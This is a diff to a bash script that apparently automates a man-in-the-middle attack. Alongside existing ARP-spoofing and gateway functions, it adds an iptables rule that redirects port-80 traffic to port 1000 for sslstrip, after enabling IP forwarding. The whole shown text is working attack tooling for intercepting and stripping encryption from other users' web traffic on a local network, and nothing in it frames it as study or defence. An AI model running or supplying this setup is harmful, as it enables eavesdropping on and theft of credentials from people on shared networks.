@@ -18,6 +18,18 @@ function routeme_f() {
     if [ $(cat /proc/sys/net/ipv4/ip_forward) != 1 ]; then
         echo '1' > /proc/sys/net/ipv4/ip_forward
     fi
+    echo $(tput setaf 2)Complete!$(tput sgr0)
+    echo ''
+    sleep 2
+}
+
+function ip_tables_f() {
+    echo 'Configuring iptables for sslstrip traffice.'
+    echo 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000'
+    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
+    echo $(tput setaf 2)Complete!$(tput sgr0)
+    echo ''
+    sleep 2
 }
 
 function gateway_device_f() {
@@ -56,6 +68,7 @@ function arpspoof_f() {
 }
 
 routeme_f
+ip_tables_f
 gateway_device_f
 #macspoof_f
 gateway_f
